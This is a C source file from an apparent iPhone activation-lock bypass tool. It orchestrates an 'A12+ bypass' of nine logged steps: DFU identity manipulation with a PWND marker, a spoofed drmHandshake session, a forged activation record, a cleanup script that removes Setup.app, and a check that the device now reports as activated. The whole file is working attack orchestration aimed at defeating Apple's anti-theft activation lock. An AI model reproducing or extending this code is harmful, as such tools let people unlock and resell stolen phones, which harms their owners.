/*
 * path_b.c -- Path B bypass orchestration for A12+ devices.
 *
 * Orchestrates the full A12+ bypass flow:
 *   1. DFU identity manipulation (serial descriptor PWND marker)
 *   2. Signal type detection (cellular vs WiFi-only)
 *   3. drmHandshake session activation protocol
 *   4. Post-bypass deletescript cleanup
 *   5. Activation state verification
 *
 * Identity manipulation internals are in path_b_identity.c.
 */

#include <string.h>
#include <plist/plist.h>

#include "bypass/path_b.h"
#include "bypass/signal.h"
#include "bypass/deletescript.h"
#include "activation/activation.h"
#include "activation/session.h"
#include "activation/record.h"
#include "util/log.h"

/* Forward declarations for module callbacks. */
static int path_b_probe(device_info_t *dev);
static int path_b_execute(device_info_t *dev);

const bypass_module_t path_b_module = {
    .name        = "path_b_a12plus",
    .description = "A12+ bypass via identity manipulation + session activation",
    .probe       = path_b_probe,
    .execute     = path_b_execute
};

/*
 * path_b_probe -- Check if this device is eligible for Path B.
 *
 * Path B targets A12+ devices (not checkm8-vulnerable) that are
 * currently in DFU mode. Returns 1 if compatible, 0 if not, -1 on error.
 */
static int path_b_probe(device_info_t *dev)
{
    if (!dev) {
        log_error("[path_b] NULL device in probe");
        return -1;
    }

    /* A12+ devices have checkm8_vulnerable == 0 */
    if (dev->checkm8_vulnerable != 0) {
        log_debug("[path_b] Device is checkm8-vulnerable (A5-A11), skipping");
        return 0;
    }

    /* Must be in DFU mode for identity manipulation */
    if (dev->is_dfu_mode != 1) {
        log_debug("[path_b] Device not in DFU mode, skipping");
        return 0;
    }

    log_info("[path_b] A12+ device in DFU mode detected -- Path B compatible");
    return 1;
}

/*
 * step_manipulate_identity -- Step 1: modify serial descriptors in DFU.
 */
static int step_manipulate_identity(device_info_t *dev)
{
    int rc;

    log_info("[path_b] Step 1/9: Manipulating device identity in DFU...");

    rc = path_b_manipulate_identity(dev);
    if (rc != 0) {
        log_error("[path_b] Identity manipulation failed");
        return -1;
    }

    log_info("[path_b] Identity manipulation succeeded");
    return 0;
}

/*
 * step_detect_signal -- Step 2-3: detect and display signal info.
 */
static int step_detect_signal(device_info_t *dev)
{
    signal_type_t sig;

    log_info("[path_b] Step 2/9: Detecting signal type...");

    sig = signal_detect_type(dev);
    (void)sig; /* Used implicitly by signal_print_info */

    log_info("[path_b] Step 3/9: Signal info:");
    signal_print_info(dev);

    return 0;
}

/*
 * step_session_handshake -- Steps 4-6: session info + drmHandshake + activation info.
 * On success, *out_response and *out_info are set (caller must free both).
 */
static int step_session_handshake(device_info_t *dev,
                                  plist_t *out_response,
                                  plist_t *out_info)
{
    plist_t session  = NULL;
    plist_t response = NULL;
    plist_t info     = NULL;
    int     rc;

    /* Step 4: get session info blob from device */
    log_info("[path_b] Step 4/9: Requesting session info...");
    rc = session_get_info(dev, &session);
    if (rc != 0 || !session) {
        log_error("[path_b] Failed to get session info");
        return -1;
    }
    log_info("[path_b] Session info retrieved");

    /* Step 5: perform local drmHandshake */
    log_info("[path_b] Step 5/9: Performing drmHandshake...");
    rc = session_drm_handshake(dev, session, &response);
    if (rc != 0 || !response) {
        log_error("[path_b] drmHandshake failed");
        plist_free(session);
        return -1;
    }
    log_info("[path_b] drmHandshake succeeded");

    /* Step 6: create activation info with session response */
    log_info("[path_b] Step 6/9: Creating activation info...");
    rc = session_create_activation_info(dev, response, &info);
    if (rc != 0 || !info) {
        log_error("[path_b] Failed to create activation info");
        plist_free(session);
        plist_free(response);
        return -1;
    }
    log_info("[path_b] Activation info created");

    plist_free(session);

    *out_response = response;
    *out_info     = info;
    return 0;
}

/*
 * step_activate -- Step 7: build A12+ record and activate with session.
 */
static int step_activate(device_info_t *dev, plist_t response)
{
    plist_t record = NULL;
    int     rc;

    log_info("[path_b] Step 7/9: Building A12+ activation record...");
    record = record_build_a12(dev);
    if (!record) {
        log_error("[path_b] Failed to build A12+ activation record");
        return -1;
    }
    log_info("[path_b] Activation record built");

    log_info("[path_b] Activating device with session...");
    rc = session_activate(dev, record, response);
    if (rc != 0) {
        log_error("[path_b] Session activation failed");
        record_free(record);
        return -1;
    }
    log_info("[path_b] Session activation succeeded");

    record_free(record);
    return 0;
}

/*
 * step_deletescript -- Step 8: run post-bypass cleanup.
 */
static int step_deletescript(device_info_t *dev)
{
    int rc;

    log_info("[path_b] Step 8/9: Running deletescript cleanup...");

    rc = deletescript_run(dev);
    if (rc != 0) {
        log_warn("[path_b] Deletescript reported errors (non-fatal)");
        /* Continue -- activation may still be valid even if cleanup
         * partially fails (e.g. Setup.app already removed). */
    } else {
        log_info("[path_b] Deletescript completed");
    }

    return 0;
}

/*
 * step_verify -- Step 9: check if activation was successful.
 */
static int step_verify(device_info_t *dev)
{
    int rc;

    log_info("[path_b] Step 9/9: Verifying activation state...");

    rc = activation_is_activated(dev);
    if (rc == 1) {
        log_info("[path_b] Verification PASSED -- device is activated");
        return 0;
    }

    if (rc == 0) {
        log_error("[path_b] Verification FAILED -- device is NOT activated");
    } else {
        log_error("[path_b] Verification ERROR -- could not query state");
    }

    return -1;
}

/*
 * path_b_execute -- Run the full A12+ bypass flow.
 *
 * Steps are separated into helper functions for clarity and to keep
 * the top-level flow readable. Each step logs its own progress.
 */
static int path_b_execute(device_info_t *dev)
{
    plist_t response = NULL;
    plist_t info     = NULL;
    int     rc;

    log_info("[path_b] === Starting A12+ bypass (Path B) ===");
    log_info("[path_b] Device: %s (CPID 0x%04X, ECID 0x%llX)",
             dev->product_type, dev->cpid,
             (unsigned long long)dev->ecid);

    /* Step 1: identity manipulation */
    rc = step_manipulate_identity(dev);
    if (rc != 0)
        return -1;

    /* Steps 2-3: signal detection */
    rc = step_detect_signal(dev);
    if (rc != 0)
        return -1;

    /* Steps 4-6: session handshake */
    rc = step_session_handshake(dev, &response, &info);
    if (rc != 0)
        return -1;

    /* Step 7: build record + activate */
    rc = step_activate(dev, response);
    if (rc != 0) {
        plist_free(response);
        plist_free(info);
        return -1;
    }

    /* Free session plists before proceeding to cleanup */
    plist_free(response);
    plist_free(info);

    /* Step 8: deletescript cleanup */
    step_deletescript(dev);

    /* Step 9: verify activation */
    rc = step_verify(dev);

    if (rc == 0) {
        log_info("[path_b] === A12+ bypass completed successfully ===");
    } else {
        log_error("[path_b] === A12+ bypass FAILED at verification ===");
    }

    return rc;
}
